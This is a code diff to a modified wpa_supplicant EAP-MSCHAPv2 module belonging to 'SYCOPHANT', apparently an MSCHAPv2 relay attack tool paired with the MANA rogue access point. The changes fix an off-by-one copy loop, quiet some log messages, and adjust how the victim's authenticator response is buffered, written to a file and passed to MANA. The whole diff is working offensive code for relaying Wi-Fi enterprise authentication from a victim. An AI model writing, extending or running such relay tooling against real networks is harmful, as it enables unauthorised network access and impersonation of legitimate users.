@@ -322,7 +322,7 @@ static struct wpabuf * eap_mschapv2_challenge_reply(
 		wpa_hexdump(MSG_INFO, "SYCOPHANT : MANA CONTENTS",
 			line, resp->used);
 
-		for (int i = 10; i < resp->used+1; i++){
+		for (int i = 10; i < resp->used; i++){
 			resp->buf[i] = line[i];
 		}
 
@@ -389,7 +389,7 @@ static struct wpabuf * eap_mschapv2_challenge(
 
 	wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Received challenge");
 	if (req_len < sizeof(*req) + 1) {
-		wpa_printf(MSG_INFO, "EAP-MSCHAPV2: Too short challenge data "
+		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Too short challenge data "
 			   "(len %lu)", (unsigned long) req_len);
 		ret->ignore = TRUE;
 		return NULL;
@@ -398,14 +398,14 @@ static struct wpabuf * eap_mschapv2_challenge(
 	challenge_len = *pos++;
 	len = req_len - sizeof(*req) - 1;
 	if (challenge_len != MSCHAPV2_CHAL_LEN) {
-		wpa_printf(MSG_INFO, "EAP-MSCHAPV2: Invalid challenge length "
+		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Invalid challenge length "
 			   "%lu", (unsigned long) challenge_len);
 		ret->ignore = TRUE;
 		return NULL;
 	}
 
 	if (len < challenge_len) {
-		wpa_printf(MSG_INFO, "EAP-MSCHAPV2: Too short challenge"
+		wpa_printf(MSG_DEBUG, "EAP-MSCHAPV2: Too short challenge"
 			   " packet: len=%lu challenge_len=%lu",
 			   (unsigned long) len, (unsigned long) challenge_len);
 		ret->ignore = TRUE;
@@ -545,15 +545,14 @@ static struct wpabuf * eap_mschapv2_success(struct eap_sm *sm,
 	
 	wpa_hexdump(MSG_INFO, "SYCOPHANT : VALIDATE DATA CREATED BY VICTIM", data->auth_response, sizeof(data->auth_response));
 
-	u8 * line = data->auth_response;
+	u8 line [20]; 	
+	memcpy(line, data->auth_response, 20);
 
 	wpa_hexdump(MSG_INFO, "SYCOPHANT : VALIDATE DATA CREATED BY VICTIM", line, 20);
-	
-	fwrite(line,20,1,validateFile); 
-	
-	wpa_printf(MSG_INFO, "SYCOPHANT : VALIDATE DATA GIVEN TO MANA");
+ 	fwrite(line,20,1,validateFile); 	
+	wpa_hexdump(MSG_INFO, "SYCOPHANT : VALIDATE DATA GIVEN TO MANA", line, 20);
 
-	fclose(outFile);
+	fclose(validateFile);
 
 	// Inform of our readyness
 	// char* outLockName = "CHALLENGE_LOCK";
